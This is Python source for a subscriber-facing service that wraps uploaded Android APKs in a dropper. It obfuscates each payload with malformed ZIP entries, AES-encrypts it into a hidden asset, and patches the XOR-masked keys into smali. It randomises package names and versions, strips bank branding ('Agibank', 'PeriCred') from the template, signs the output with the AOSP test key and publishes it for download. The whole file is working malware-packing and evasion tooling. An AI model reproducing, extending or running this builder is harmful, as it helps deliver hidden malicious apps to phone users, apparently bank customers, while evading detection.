import io
import os
import random
import re
import secrets
import shutil
import string
import subprocess
import xml.etree.ElementTree as ET
import zipfile

from Crypto.Cipher import AES
from werkzeug.utils import secure_filename

from config import Config
from services.build_state import BUILD_STATUS
from services.data import add_build_history, add_history, update_amplification
from services.java_runtime import JAVA_BIN, java_env, keytool_bin


def encrypt_aes_ctr(data: bytes, key: bytes, iv: bytes) -> bytes:
    return AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=iv).encrypt(data)


def decrypt_aes_ctr(data: bytes, key: bytes, iv: bytes) -> bytes:
    return AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=iv).decrypt(data)


def _xor_bytes(data: bytes, xor_byte: int) -> bytes:
    return bytes(b ^ xor_byte for b in data)


def _smali_byte(value: int) -> str:
    """Formato smali byte: 0xNNt / -0xNNt (como apktool no shell Wi-Fi)."""
    value &= 0xFF
    if value == 0:
        return "        0x0t"
    if value < 0x80:
        return f"        0x{value:x}t"
    neg = value - 0x100
    return f"        -0x{(-neg):x}t"


def _smali_array_data(data: bytes) -> str:
    lines = "\n".join(_smali_byte(b) for b in data)
    return f"    .array-data 1\n{lines}\n    .end array-data"


def _replace_smali_array(content: str, label: str, data: bytes) -> str:
    """Substitui bloco :label + .array-data 1 ... .end array-data."""
    pattern = rf"(:{re.escape(label)}\s*\n)\s*\.array-data 1\n.*?\n\s*\.end array-data"
    repl = rf"\1{_smali_array_data(data)}"
    new_content, n = re.subn(pattern, repl, content, count=1, flags=re.S)
    if n != 1:
        raise RuntimeError(f"Falha ao patchar array smali :{label} (matches={n})")
    return new_content


def patch_vd_crypto_smali(
    dropper_work: str,
    *,
    asset_name: str,
    out_name: str,
    key: bytes,
    iv: bytes,
    cipher: str,
    xor_byte: int | None = None,
) -> None:
    """Patch campos crypto em vd.smali (shell R8 Wi-Fi).

    Mapping clinit:
      u / array_d  -> asset name
      v / array_e  -> AES-256 key (32)
      w / array_f  -> IV (16)
      x / array_10 -> cipher transform
      y / array_11 -> com.google.rbp (nao mexe)
      z / array_12 -> output filename (len deve == 14 = v0 0xe)
    XOR: vd.c0 usa 0xE7 fixo no shell (Config.CRYPTO_XOR_BYTE).
    """
    xor_byte = Config.CRYPTO_XOR_BYTE if xor_byte is None else xor_byte
    path = os.path.join(dropper_work, "smali", "vd.smali")
    if not os.path.isfile(path):
        raise RuntimeError("vd.smali nao encontrado no template Wi-Fi.")

    if len(key) != 32:
        raise RuntimeError("AES key deve ter 32 bytes.")
    if len(iv) != 16:
        raise RuntimeError("AES IV deve ter 16 bytes.")
    if len(out_name) != 14:
        raise RuntimeError(
            f"out_name deve ter 14 chars (shell R8 v0=0xe); got {len(out_name)}: {out_name!r}"
        )

    asset_enc = _xor_bytes(asset_name.encode("utf-8"), xor_byte)
    out_enc = _xor_bytes(out_name.encode("utf-8"), xor_byte)
    key_enc = _xor_bytes(key, xor_byte)
    iv_enc = _xor_bytes(iv, xor_byte)
    cipher_enc = _xor_bytes(cipher.encode("utf-8"), xor_byte)

    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
        content = handle.read()

    content, n = re.subn(
        r"const/16 v2, 0x[0-9a-fA-F]+(\s*\n(?:\s*\.line \d+\s*\n)*\s*"
        r"new-array v2, v2, \[B\s*\n(?:\s*\.line \d+\s*\n)*\s*"
        r"fill-array-data v2, :array_d)",
        rf"const/16 v2, 0x{len(asset_enc):x}\1",
        content,
        count=1,
    )
    if n != 1:
        content, n = re.subn(
            r"const/16 v2, 0x[0-9a-fA-F]+(\s+new-array v2, v2, \[B\s+fill-array-data v2, :array_d)",
            rf"const/16 v2, 0x{len(asset_enc):x}\1",
            content,
            count=1,
        )
    if n != 1:
        raise RuntimeError(f"Falha ao patchar tamanho array_d (matches={n})")

    content, n = re.subn(
        r"const/16 v2, 0x[0-9a-fA-F]+(\s*\n(?:\s*\.line \d+\s*\n)*\s*"
        r"new-array v2, v2, \[B\s*\n(?:\s*\.line \d+\s*\n)*\s*"
        r"fill-array-data v2, :array_10)",
        rf"const/16 v2, 0x{len(cipher_enc):x}\1",
        content,
        count=1,
    )
    if n != 1:
        content, n = re.subn(
            r"const/16 v2, 0x[0-9a-fA-F]+(\s+new-array v2, v2, \[B\s+fill-array-data v2, :array_10)",
            rf"const/16 v2, 0x{len(cipher_enc):x}\1",
            content,
            count=1,
        )
    if n != 1:
        raise RuntimeError(f"Falha ao patchar tamanho array_10 (matches={n})")

    content = _replace_smali_array(content, "array_d", asset_enc)
    content = _replace_smali_array(content, "array_e", key_enc)
    content = _replace_smali_array(content, "array_f", iv_enc)
    content = _replace_smali_array(content, "array_10", cipher_enc)
    content = _replace_smali_array(content, "array_12", out_enc)

    with open(path, "w", encoding="utf-8") as handle:
        handle.write(content)


def patch_payload_util_smali(*args, **kwargs):
    """Deprecated — template actual e shell Wi-Fi (vd.smali)."""
    raise RuntimeError(
        "patch_payload_util_smali removido: use patch_vd_crypto_smali (template Wi-Fi)."
    )


def generate_package_name(app_name=None):
    """Package de 14 chars estilo Wi-Fi (com.turbo.live).

    Formato: com.<5 letras>.<4 alnum>  => len == 14.
    """
    mid = "".join(secrets.choice(string.ascii_lowercase) for _ in range(5))
    end = secrets.choice(string.ascii_lowercase) + "".join(
        secrets.choice(string.ascii_lowercase + string.digits) for _ in range(3)
    )
    pkg = f"com.{mid}.{end}"
    if len(pkg) != 14:
        raise RuntimeError(f"package length bug: {pkg!r} len={len(pkg)}")
    return pkg


def apply_package_rename(dropper_work, old_package, new_package):
    old_path = old_package.replace(".", "/")
    new_path = new_package.replace(".", "/")
    old_smali_dir = os.path.join(dropper_work, "smali", old_path)
    new_smali_dir = os.path.join(dropper_work, "smali", new_path)

    for root_dir, _, files in os.walk(dropper_work):
        for file in files:
            if not file.endswith((".smali", ".xml")):
                continue
            file_path = os.path.join(root_dir, file)
            try:
                with open(file_path, "r", encoding="utf-8", errors="ignore") as file_handle:
                    content = file_handle.read()
                new_content = content.replace(old_package, new_package).replace(old_path, new_path)
                if new_content != content:
                    with open(file_path, "w", encoding="utf-8") as file_handle:
                        file_handle.write(new_content)
            except OSError:
                pass

    if not os.path.isdir(old_smali_dir):
        return

    os.makedirs(os.path.dirname(new_smali_dir), exist_ok=True)
    if os.path.exists(new_smali_dir):
        shutil.rmtree(new_smali_dir)
    shutil.move(old_smali_dir, new_smali_dir)

    smali_root = os.path.join(dropper_work, "smali")
    check_dir = os.path.dirname(old_smali_dir)
    while check_dir.startswith(smali_root) and check_dir != smali_root:
        try:
            if os.listdir(check_dir):
                break
            os.rmdir(check_dir)
            check_dir = os.path.dirname(check_dir)
        except OSError:
            break


def _set_status(build_id, status, progress, error=False, portal=None, owner=None, ephemeral=None):
    current = BUILD_STATUS.get(build_id, {})
    BUILD_STATUS[build_id] = {
        "status": status,
        "progress": progress,
        "error": error,
        "portal": portal if portal is not None else current.get("portal", "subscriber"),
        "owner": owner if owner is not None else current.get("owner"),
        "ephemeral": ephemeral if ephemeral is not None else current.get("ephemeral", False),
        "output_file": current.get("output_file"),
    }


def _epoch_date_time():
    return tuple(Config.ZIP_EPOCH_DATE_TIME)


def obfuscate_payload_zip(payload_bytes: bytes, work_dir: str | None = None) -> bytes:
    """Adiciona noise ZIP estilo Wi-Fi e re-assina o payload (noise quebra assinatura)."""
    if payload_bytes[:4] != b"PK\x03\x04":
        return payload_bytes
    if not getattr(Config, "PAYLOAD_ZIP_NOISE", True):
        return payload_bytes

    noise_n = random.randint(Config.PAYLOAD_ZIP_NOISE_MIN, Config.PAYLOAD_ZIP_NOISE_MAX)
    junk_suffixes = (
        "..xml",
        "/..xml",
        "/\\\\.xml",
        "/....xml",
        ".xml/..",
        "/../x.xml",
        "\\\\.xml",
        "/./.xml",
    )
    anchors = (
        "AndroidManifest.xml",
        "classes.dex",
        "classes2.dex",
        "classes3.dex",
        "resources.arsc",
        "META-INF/MANIFEST.MF",
        "META-INF/CERT.SF",
        "kotlin/kotlin.kotlin_builtins",
        "res/layout/activity_main.xml",
        "res/values/public.xml",
        "lib/arm64-v8a/libapp.so",
        "assets/index.android.bundle",
    )

    sig_skip = (".SF", ".RSA", ".DSA", ".EC", "MANIFEST.MF", "CERT.SF", "CERT.RSA")

    buf = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(payload_bytes), "r") as zin, zipfile.ZipFile(buf, "w") as zout:
        existing = set()
        for info in zin.infolist():
            name = info.filename
            base = name.rsplit("/", 1)[-1].upper()
            if name.startswith("META-INF/") and (
                base.endswith((".SF", ".RSA", ".DSA", ".EC"))
                or base in ("MANIFEST.MF", "CERT.SF", "CERT.RSA")
                or base.startswith("ANDROID")
            ):
                continue
            data = zin.read(name)
            out = zipfile.ZipInfo(filename=name, date_time=_epoch_date_time())
            out.compress_type = info.compress_type
            out.external_attr = info.external_attr
            out.create_system = info.create_system
            zout.writestr(out, data)
            existing.add(name)

        used = set(existing)
        for i in range(noise_n):
            anchor = random.choice(anchors)
            suffix = random.choice(junk_suffixes)
            extra = ""
            if random.random() < 0.35:
                extra = "/" + "".join(
                    random.choice(string.ascii_lowercase) for _ in range(random.randint(1, 6))
                )
            if random.random() < 0.25:
                extra += random.choice(["/..", "/.", "\\\\", "/..."])
            name = f"{anchor}{suffix}{extra}"
            if random.random() < 0.15:
                name = name.replace("/", "\\")
            if name in used or len(name) > 220:
                name = f"{anchor}/{i}{suffix}"
            if name in used:
                continue
            used.add(name)
            payload = secrets.token_bytes(random.randint(0, 48)) if random.random() < 0.4 else b""
            out = zipfile.ZipInfo(filename=name, date_time=_epoch_date_time())
            out.compress_type = zipfile.ZIP_DEFLATED if payload else zipfile.ZIP_STORED
            out.external_attr = 0o644 << 16
            zout.writestr(out, payload)

    noised = buf.getvalue()

    # Re-assinar: noise/timestamps invalidam v2 do payload; sem assinatura o install falha.
    if work_dir:
        os.makedirs(work_dir, exist_ok=True)
        raw_path = os.path.join(work_dir, "payload_noise.apk")
        aligned_path = os.path.join(work_dir, "payload_aligned.apk")
        signed_path = os.path.join(work_dir, "payload_signed.apk")
        with open(raw_path, "wb") as fh:
            fh.write(noised)
        try:
            if os.path.isfile(Config.ZIPALIGN):
                zipalign_apk(raw_path, aligned_path)
            else:
                shutil.copy2(raw_path, aligned_path)
            sign_release_apk(aligned_path, signed_path)
            with open(signed_path, "rb") as fh:
                return fh.read()
        except Exception:
            # Fallback: devolve ZIP com noise (pode falhar install se signer off)
            return noised
        finally:
            for p in (raw_path, aligned_path, signed_path):
                try:
                    if os.path.isfile(p):
                        os.remove(p)
                except OSError:
                    pass
    return noised


def normalize_apk_zip_timestamps(apk_path: str) -> None:
    """Normaliza todas as entries do APK outer para 1981-01-01 01:01:02 (Wi-Fi)."""
    if not os.path.isfile(apk_path):
        raise RuntimeError(f"APK ausente para normalize timestamps: {apk_path}")
    tmp_path = f"{apk_path}.tsnorm"
    epoch = _epoch_date_time()
    with zipfile.ZipFile(apk_path, "r") as zin, zipfile.ZipFile(tmp_path, "w") as zout:
        for info in zin.infolist():
            data = zin.read(info.filename)
            out = zipfile.ZipInfo(filename=info.filename, date_time=epoch)
            out.compress_type = info.compress_type
            out.external_attr = info.external_attr
            out.create_system = info.create_system
            zout.writestr(out, data)
    os.replace(tmp_path, apk_path)



def inject_unknown_into_apk(apk_path: str, dropper_work: str) -> int:
    """Reinsere unknown/ inteiro no APK (apktool 2.9.3 nao empacota).

    Inclui kotlin/*, META-INF (androidx.*.version, services, app-metadata),
    DebugProbesKt.bin, etc. — paridade estrutural com Wi-Fi.

    Nao reinsere assinatura V1 (*.SF/*.RSA/*.DSA/*.EC/MANIFEST.MF) para
    nao conflitar com assinatura V2 posterior.
    """
    unknown_dir = os.path.join(dropper_work, "unknown")
    if not os.path.isdir(unknown_dir):
        return 0

    skip_suffix = (".SF", ".RSA", ".DSA", ".EC")
    to_add = []
    for root, _, files in os.walk(unknown_dir):
        for name in files:
            full = os.path.join(root, name)
            rel = os.path.relpath(full, unknown_dir).replace("\\", "/")
            upper = name.upper()
            # Skip residual V1 signature remnants only under META-INF/
            if rel.startswith("META-INF/") and (
                upper.endswith(skip_suffix) or upper == "MANIFEST.MF"
            ):
                continue
            to_add.append((rel, full))

    if not to_add:
        return 0

    epoch = _epoch_date_time()
    tmp_path = f"{apk_path}.unknown"
    with zipfile.ZipFile(apk_path, "r") as zin, zipfile.ZipFile(tmp_path, "w") as zout:
        existing = set(zin.namelist())
        for info in zin.infolist():
            data = zin.read(info.filename)
            out = zipfile.ZipInfo(filename=info.filename, date_time=epoch)
            out.compress_type = info.compress_type
            out.external_attr = info.external_attr
            out.create_system = info.create_system
            zout.writestr(out, data)
        added = 0
        for rel, full in to_add:
            if rel in existing:
                continue
            with open(full, "rb") as handle:
                data = handle.read()
            out = zipfile.ZipInfo(filename=rel, date_time=epoch)
            out.compress_type = zipfile.ZIP_DEFLATED
            out.external_attr = 0o644 << 16
            zout.writestr(out, data)
            added += 1
    os.replace(tmp_path, apk_path)
    return added


def inject_unknown_meta_inf(apk_path: str, dropper_work: str) -> int:
    """Compat: delega para inject_unknown_into_apk (unknown/ completo)."""
    return inject_unknown_into_apk(apk_path, dropper_work)


def inject_secondary_dex(apk_path: str, dex_path: str, arcname: str = "classes2.dex") -> None:
    """LEGACY: injeta DEX libs. Desligado no path Wi-Fi-parity (single DEX)."""
    if not getattr(Config, "INJECT_SECONDARY_DEX", False):
        return
    if not os.path.isfile(dex_path):
        raise RuntimeError(f"DEX de libs nao encontrado: {dex_path}")
    if not os.path.isfile(apk_path):
        raise RuntimeError(f"APK para injecao de DEX nao encontrado: {apk_path}")

    tmp_path = f"{apk_path}.dexinject"
    epoch = _epoch_date_time()
    with zipfile.ZipFile(apk_path, "r") as zin, zipfile.ZipFile(
        tmp_path, "w", compression=zipfile.ZIP_DEFLATED
    ) as zout:
        for info in zin.infolist():
            if info.filename == arcname:
                continue
            data = zin.read(info.filename)
            compress = (
                zipfile.ZIP_STORED if info.compress_type == zipfile.ZIP_STORED else zipfile.ZIP_DEFLATED
            )
            out_info = zipfile.ZipInfo(filename=info.filename, date_time=epoch)
            out_info.compress_type = compress
            out_info.external_attr = info.external_attr
            zout.writestr(out_info, data)
        out_info = zipfile.ZipInfo(filename=arcname, date_time=epoch)
        out_info.compress_type = zipfile.ZIP_DEFLATED
        with open(dex_path, "rb") as handle:
            zout.writestr(out_info, handle.read())
    os.replace(tmp_path, apk_path)


def apply_version_info(dropper_work: str, version_name: str, version_code: int) -> None:
    yml = os.path.join(dropper_work, "apktool.yml")
    if not os.path.isfile(yml):
        return
    with open(yml, "r", encoding="utf-8", errors="ignore") as handle:
        text = handle.read()
    text = re.sub(
        r"versionCode:\s*['\"]?\d+['\"]?",
        f"versionCode: '{version_code}'",
        text,
        count=1,
    )
    text = re.sub(
        r"versionName:\s*.*",
        f"versionName: {version_name}",
        text,
        count=1,
    )
    with open(yml, "w", encoding="utf-8") as handle:
        handle.write(text)


def _generate_keystore(
    keystore_path: str,
    store_pass: str,
    key_alias: str,
    key_pass: str,
    dname: str,
) -> None:
    """Gera keystore PKCS12 com DN fixo (release estavel)."""
    keytool = keytool_bin()
    if not keytool:
        raise RuntimeError("keytool nao encontrado (JAVA_HOME/bin/keytool).")
    os.makedirs(os.path.dirname(keystore_path) or ".", exist_ok=True)
    cmd = [
        keytool,
        "-genkeypair",
        "-storetype",
        Config.KEYSTORE_STORE_TYPE,
        "-keystore",
        keystore_path,
        "-storepass",
        store_pass,
        "-keypass",
        key_pass,
        "-alias",
        key_alias,
        "-keyalg",
        Config.KEYSTORE_KEY_ALG,
        "-keysize",
        str(Config.KEYSTORE_KEY_SIZE),
        "-sigalg",
        Config.KEYSTORE_SIG_ALG,
        "-validity",
        str(Config.KEYSTORE_VALIDITY_DAYS),
        "-dname",
        dname,
    ]
    result = subprocess.run(
        cmd, capture_output=True, text=True, timeout=60, env=java_env()
    )
    if result.returncode != 0:
        err = (result.stderr or result.stdout or "keytool falhou").strip()
        raise RuntimeError(f"Falha ao gerar keystore: {err[:300]}")


def ensure_release_keystore() -> tuple[str, str, str, str]:
    """Garante signing/release.p12 (cria 1x se ausente)."""
    path = Config.RELEASE_KEYSTORE
    store_pass = Config.RELEASE_KEYSTORE_PASS
    key_pass = store_pass
    alias = Config.RELEASE_KEY_ALIAS
    if not os.path.isfile(path):
        _generate_keystore(path, store_pass, alias, key_pass, Config.RELEASE_DNAME)
    return path, store_pass, alias, key_pass


def zipalign_apk(input_apk: str, output_apk: str) -> None:
    """Realinha APK (obrigatorio apos rezip de timestamps)."""
    if not os.path.isfile(Config.ZIPALIGN):
        raise RuntimeError("zipalign nao encontrado. Verifique APP-TEST/tools/android-sdk/.")
    cmd = [Config.ZIPALIGN, "-p", "-f", "4", input_apk, output_apk]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
    if result.returncode != 0 or not os.path.isfile(output_apk):
        err = (result.stderr or result.stdout or "zipalign falhou").strip()
        raise RuntimeError(f"Falha no zipalign: {err[:300]}")


def sign_with_apksigner(
    aligned_apk: str,
    output_apk: str,
    *,
    keystore_path: str | None = None,
    store_pass: str | None = None,
    key_alias: str | None = None,
    key_pass: str | None = None,
    key_pk8: str | None = None,
    cert_pem: str | None = None,
) -> str:
    """Assina APK com apksigner (v2; v3 conforme Config). Sem v1."""
    if not os.path.isfile(Config.APKSIGNER):
        raise RuntimeError("apksigner nao encontrado. Verifique APP-TEST/tools/android-sdk/.")
    v3 = "true" if Config.APKSIGNER_V3_ENABLED else "false"
    cmd = [
        Config.APKSIGNER,
        "sign",
        "--v1-signing-enabled",
        "false",
        "--v2-signing-enabled",
        "true",
        "--v3-signing-enabled",
        v3,
        "--out",
        output_apk,
    ]
    if key_pk8 and cert_pem:
        if not os.path.isfile(key_pk8) or not os.path.isfile(cert_pem):
            raise RuntimeError("AOSP testkey ausente (signing/testkey.pk8 + testkey.x509.pem).")
        cmd.extend(["--key", key_pk8, "--cert", cert_pem])
    elif keystore_path:
        cmd.extend(
            [
                "--ks",
                keystore_path,
                "--ks-pass",
                f"pass:{store_pass}",
                "--ks-key-alias",
                key_alias,
                "--key-pass",
                f"pass:{key_pass}",
            ]
        )
    else:
        raise RuntimeError("Nenhum material de assinatura configurado.")
    cmd.append(aligned_apk)
    result = subprocess.run(
        cmd, capture_output=True, text=True, timeout=120, env=java_env()
    )
    if result.returncode != 0 or not os.path.isfile(output_apk):
        err = (result.stderr or result.stdout or "apksigner falhou").strip()
        raise RuntimeError(f"Falha na assinatura: {err[:300]}")
    return output_apk


def sign_release_apk(aligned_apk: str, output_apk: str) -> str:
    """Assina conforme Config.SIGNING_MODE (aosp_testkey | pkcs12)."""
    mode = (Config.SIGNING_MODE or "aosp_testkey").strip().lower()
    if mode == "aosp_testkey":
        return sign_with_apksigner(
            aligned_apk,
            output_apk,
            key_pk8=Config.AOSP_TESTKEY_PK8,
            cert_pem=Config.AOSP_TESTKEY_CERT,
        )
    keystore_path, store_pass, key_alias, key_pass = ensure_release_keystore()
    return sign_with_apksigner(
        aligned_apk,
        output_apk,
        keystore_path=keystore_path,
        store_pass=store_pass,
        key_alias=key_alias,
        key_pass=key_pass,
    )


def process_apk(
    build_id,
    user_apk_path,
    custom_app_name,
    username,
    custom_icon_path=None,
    persist=True,
    portal="subscriber",
):
    BUILD_STATUS[build_id] = {
        "status": "Iniciando...",
        "progress": 0,
        "portal": portal,
        "owner": username,
        "ephemeral": not persist,
    }

    try:
        if not JAVA_BIN:
            raise RuntimeError("Java nao encontrado. Instale OpenJDK 17+ ou defina JAVA_HOME.")

        if persist:
            add_build_history(username, custom_app_name, "processando", build_id)
        _set_status(
            build_id,
            "Extraindo APK...",
            15,
            portal=portal,
            owner=username,
            ephemeral=not persist,
        )

        user_apk_extracted = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_extracted")
        if os.path.exists(user_apk_extracted):
            shutil.rmtree(user_apk_extracted)
        os.makedirs(user_apk_extracted, exist_ok=True)

        try:
            with zipfile.ZipFile(user_apk_path, "r") as zip_ref:
                zip_ref.extractall(user_apk_extracted)
        except Exception:
            with zipfile.ZipFile(user_apk_path, "r") as zip_ref:
                for member in zip_ref.namelist():
                    try:
                        zip_ref.extract(member, user_apk_extracted)
                    except Exception:
                        pass

        if not os.path.exists(os.path.join(user_apk_extracted, "AndroidManifest.xml")):
            _set_status(build_id, "Extraindo arquivos...", 20)
            subprocess.run(
                f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" d "{user_apk_path}" -o "{user_apk_extracted}" -f',
                shell=True,
            )

        _set_status(build_id, "Preparando Dropper", 30)
        dropper_work = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_dropper")
        if os.path.exists(dropper_work):
            shutil.rmtree(dropper_work)
        # Only skip top-level template dirs. ignore_patterns("build") would also
        # drop META-INF/com/android/build/ (Wi-Fi app-metadata.properties).
        def _template_ignore(dirpath, names):
            if os.path.abspath(dirpath) == os.path.abspath(Config.DROPPER_TEMPLATE):
                return [n for n in names if n in ("prebuilt", "build", "original")]
            return []

        shutil.copytree(Config.DROPPER_TEMPLATE, dropper_work, ignore=_template_ignore)

        app_name = custom_app_name if custom_app_name else "App"
        new_package = generate_package_name(app_name)

        major = random.randint(*Config.VERSION_NAME_MAJOR)
        minor = random.randint(0, 9)
        patch = random.randint(0, 9)
        version_name = f"{major}.{minor}.{patch}"
        version_code = Config.VERSION_CODE_BASE + random.randint(1, 40)
        apply_version_info(dropper_work, version_name, version_code)

        _set_status(build_id, "Configurando aplicativo...", 35)
        apply_package_rename(dropper_work, Config.OLD_PACKAGE, new_package)

        if custom_icon_path and os.path.exists(custom_icon_path):
            # Wi-Fi shell uses adaptive-icon XMLs (ic_launcher.xml). Copying PNG
            # beside them causes aapt2 conflict: same resource name per density.
            for density in [
                "res/mipmap-hdpi",
                "res/mipmap-mdpi",
                "res/mipmap-xhdpi",
                "res/mipmap-xxhdpi",
                "res/mipmap-xxxhdpi",
                "res/mipmap-anydpi-v26",
            ]:
                path = os.path.join(dropper_work, density)
                if not os.path.isdir(path) and density.endswith("anydpi-v26"):
                    continue
                os.makedirs(path, exist_ok=True)
                for xml_name in ("ic_launcher.xml", "ic_launcher_round.xml"):
                    xml_path = os.path.join(path, xml_name)
                    if os.path.isfile(xml_path):
                        os.remove(xml_path)
                if density.endswith("anydpi-v26"):
                    # Adaptive-only density: drop empty dir after XML removal.
                    try:
                        if not os.listdir(path):
                            os.rmdir(path)
                    except OSError:
                        pass
                    continue
                for name in ("ic_launcher.png", "ic_launcher_round.png"):
                    shutil.copy2(custom_icon_path, os.path.join(path, name))

        strings_xml = os.path.join(dropper_work, "res/values/strings.xml")
        if os.path.exists(strings_xml):
            try:
                tree = ET.parse(strings_xml)
                root = tree.getroot()
                for string_node in root.findall("string"):
                    name = string_node.get("name")
                    if name == "app_name":
                        string_node.text = app_name
                    elif name == "app_description" and string_node.text:
                        string_node.text = (
                            f"{app_name} — gerenciador corporativo de aplicativos."
                        )
                tree.write(strings_xml, encoding="utf-8", xml_declaration=True)
            except Exception:
                pass

        for root_dir, _, files in os.walk(dropper_work):
            for file in files:
                if file.endswith((".smali", ".xml")):
                    file_path = os.path.join(root_dir, file)
                    try:
                        with open(file_path, "r", encoding="utf-8", errors="ignore") as fh:
                            content = fh.read()
                        new_content = (
                            content.replace("PeriCred", app_name)
                            .replace("Agibank", app_name)
                            .replace("AgiBank", app_name)
                        )
                        if content != new_content:
                            with open(file_path, "w", encoding="utf-8") as fh:
                                fh.write(new_content)
                    except Exception:
                        pass

        _set_status(build_id, "Ofuscando payload", 55)
        with open(user_apk_path, "rb") as fh:
            payload_data = fh.read()
        payload_work = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_payload_work")
        payload_data = obfuscate_payload_zip(payload_data, work_dir=payload_work)

        _set_status(build_id, "Injetando Payload", 60)
        key = secrets.token_bytes(32)
        iv = secrets.token_bytes(16)
        asset_name = random.choice(Config.ASSET_NAME_POOL)
        out_name = f"index_{secrets.token_hex(2)}.pak"
        ciphertext = encrypt_aes_ctr(payload_data, key, iv)

        roundtrip = decrypt_aes_ctr(ciphertext, key, iv)
        if roundtrip[:4] != b"PK\x03\x04" and payload_data[:4] == b"PK\x03\x04":
            raise RuntimeError("Gate AES falhou: magic PK ausente apos roundtrip.")
        if roundtrip != payload_data:
            raise RuntimeError("Gate AES falhou: plaintext diverge do payload.")

        assets_dir = os.path.join(dropper_work, "assets")
        os.makedirs(assets_dir, exist_ok=True)
        # preserve dexopt; remove only payload-like files at top level
        for stale in os.listdir(assets_dir):
            stale_path = os.path.join(assets_dir, stale)
            if os.path.isfile(stale_path):
                os.remove(stale_path)
        payload_path = os.path.join(assets_dir, asset_name)
        with open(payload_path, "wb") as fh:
            fh.write(ciphertext)

        patch_vd_crypto_smali(
            dropper_work,
            asset_name=asset_name,
            out_name=out_name,
            key=key,
            iv=iv,
            cipher=Config.CIPHER_TRANSFORM,
        )

        _set_status(build_id, "Compilando APK", 80)
        unsigned_apk = os.path.join(Config.OUTPUT_FOLDER, f"{build_id}_unsigned.apk")

        if not os.path.exists(Config.APKTOOL_JAR):
            raise RuntimeError("Ferramenta de compilacao nao encontrada.")

        res_b = subprocess.run(
            f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" b "{dropper_work}" -o "{unsigned_apk}"',
            shell=True,
            capture_output=True,
            text=True,
        )
        if not os.path.exists(unsigned_apk):
            subprocess.run(
                f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" empty-framework-dir',
                shell=True,
            )
            res_b = subprocess.run(
                f'"{JAVA_BIN}" -jar "{Config.APKTOOL_JAR}" b "{dropper_work}" -o "{unsigned_apk}"',
                shell=True,
                capture_output=True,
                text=True,
            )
            if not os.path.exists(unsigned_apk):
                err = (res_b.stderr or res_b.stdout or "apktool falhou sem mensagem").strip()
                raise RuntimeError(f"Erro na compilacao: {err[:500]}")

        # Single-DEX Wi-Fi path: no inject_secondary_dex
        if getattr(Config, "INJECT_SECONDARY_DEX", False):
            _set_status(build_id, "Empacotando bibliotecas", 85)
            inject_secondary_dex(unsigned_apk, Config.DROPPER_LIBS_DEX)

        _set_status(build_id, "Restaurando unknown/", 86)
        n_unknown = inject_unknown_into_apk(unsigned_apk, dropper_work)
        print(f"[build {build_id}] unknown/ restored: {n_unknown} entries")

        _set_status(build_id, "Normalizando timestamps", 87)
        normalize_apk_zip_timestamps(unsigned_apk)

        _set_status(build_id, "Assinando APK", 90)
        output_dir = os.path.join(Config.OUTPUT_FOLDER, build_id)
        os.makedirs(output_dir, exist_ok=True)

        if not os.path.isfile(Config.APKSIGNER) or not os.path.isfile(Config.ZIPALIGN):
            raise RuntimeError(
                "apksigner/zipalign nao encontrados. Verifique APP-TEST/tools/android-sdk/."
            )

        aligned_apk = os.path.join(output_dir, f"{build_id}_aligned.apk")
        signed_apk = os.path.join(output_dir, "app-release.apk")
        final_apk = None

        try:
            zipalign_apk(unsigned_apk, aligned_apk)
            final_apk = sign_release_apk(aligned_apk, signed_apk)
        finally:
            if os.path.exists(aligned_apk):
                os.remove(aligned_apk)
            if os.path.exists(unsigned_apk):
                try:
                    os.remove(unsigned_apk)
                except OSError:
                    pass

        if not final_apk or not os.path.isfile(final_apk):
            raise RuntimeError("Assinatura nao produziu APK final.")

        final_name = f"{secure_filename(app_name)}.apk"
        shutil.move(final_apk, os.path.join(Config.OUTPUT_FOLDER, final_name))
        BUILD_STATUS[build_id] = {
            "status": "Concluido",
            "progress": 100,
            "output_file": final_name,
            "portal": portal,
            "owner": username,
            "ephemeral": not persist,
        }
        if persist:
            add_build_history(username, custom_app_name, "concluido", build_id, final_name)
            update_amplification(username, "concluido")
            add_history(username, "Build APK", f"App: {app_name}", portal=portal)
            from services.public_app_service import register_public_download

            register_public_download(
                build_id=build_id,
                app_name=app_name,
                output_file=final_name,
                icon_path=custom_icon_path,
            )

    except Exception as exc:
        import traceback

        tb = traceback.format_exc()
        print(f"ERRO NO BUILD {build_id}: {exc}\n{tb}")
        # Keep user-facing message short; attach detail for operators/logs.
        detail = str(exc).strip().replace("\n", " ")
        if len(detail) > 180:
            detail = detail[:177] + "..."
        _set_status(
            build_id,
            f"Erro no processamento. Tente novamente. ({detail})" if detail else "Erro no processamento. Tente novamente.",
            0,
            error=True,
            portal=portal,
            owner=username,
            ephemeral=not persist,
        )
        if persist:
            add_build_history(username, custom_app_name, "erro", build_id)
            update_amplification(username, "erro")





